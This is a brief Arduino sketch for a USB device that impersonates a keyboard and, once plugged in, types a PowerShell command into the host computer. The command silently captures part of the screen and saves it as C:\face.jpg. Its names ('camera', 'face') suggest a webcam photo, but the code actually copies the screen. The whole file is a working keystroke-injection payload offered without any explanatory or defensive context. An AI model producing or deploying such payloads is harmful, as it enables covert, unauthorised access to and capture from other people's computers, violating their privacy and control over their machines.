#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("powershell -c \"Add-Type -AssemblyName System.Drawing; $camera = New-Object System.Drawing.Bitmap(640, 480); $graphics = [System.Drawing.Graphics]::FromImage($camera); $graphics.CopyFromScreen(0, 0, 0, 0, $camera.Size); $camera.Save('C:\\face.jpg')\""));
}
